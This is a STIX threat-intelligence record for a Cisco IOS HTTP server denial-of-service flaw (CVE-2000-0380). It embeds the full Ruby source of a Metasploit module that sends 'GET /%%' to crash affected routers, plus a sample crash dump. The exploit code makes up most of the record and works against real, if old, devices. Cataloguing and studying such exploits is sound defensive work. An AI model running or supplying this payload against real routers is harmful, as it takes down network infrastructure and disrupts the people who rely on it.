{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8d2856d0-8991-45de-9d30-68417f456a48",
    "created": "2024-08-14T16:25:44.874783Z",
    "modified": "2024-08-14T16:25:44.874787Z",
    "name": "Cisco IOS HTTP GET /%% Request Denial of Service",
    "description": " This module triggers a Denial of Service condition in the Cisco IOS HTTP server. By sending a GET request for \"/%%\", the device becomes unresponsive. IOS 11.1 -> 12.1 are reportedly vulnerable. This module tested successfully against a Cisco 1600 Router IOS v11.2(18)P. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/cisco/ios_http_percentpercent.rb",
            "external_id": "ios_http_percentpercent.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2000-0380"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Cisco IOS HTTP GET /%% Request Denial of Service',\n      'Description'    => %q{\n        This module triggers a Denial of Service condition in the Cisco IOS\n        HTTP server. By sending a GET request for \"/%%\", the device becomes\n        unresponsive. IOS 11.1 -> 12.1 are reportedly vulnerable. This module\n        tested successfully against a Cisco 1600 Router IOS v11.2(18)P.\n      },\n      'Author' \t\t=> [ 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'BID', '1154'],\n          [ 'CVE', '2000-0380'],\n          [ 'OSVDB', '1302' ],\n        ],\n      'DisclosureDate' => '2000-04-26'))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n      ])\n\n  end\n\n  def run\n    connect\n\n    print_status(\"Sending HTTP DoS packet\")\n\n    sploit = \"GET /%% HTTP/1.0\"\n    sock.put(sploit + \"\\r\\n\")\n\n    disconnect\n  end\nend\n\n=begin\n\nPatrick Webster 20070915 Cisco 1600 Router IOS v11.2(18)P\n\nIOS info:\n  IOS (tm) 1600 Software (C1600-Y-L), Version 11.2(18)P,  RELEASE SOFTWARE (fc1)\n  Copyright (c) 1986-1999 by cisco Systems, Inc.\n  Compiled Mon 12-Apr-99 14:53 by ashah\n\nExample crash:\n\n  %Software-forced reload\n  Preparing to dump core...\n  Router>\n  *Mar  1 00:03:06.349: %SYS-2-WATCHDOG: Process aborted on watchdog timeout, Process = HTTP Server\n  -Traceback= 80EE1BC 80F0EC0 80EC004 81C0832 81C0B2E 81C0C76 81C0D68 81C0E4E\n  Queued messages:\n  *** EXCEPTION ***\n  software forced crash\n  program counter = 0x80eaca6\n  status register = 0x2700\n  vbr at time of exception = 0x4000000\n\n=end\n",
    "x_mitre_disclosure_date": "2000-04-26"
}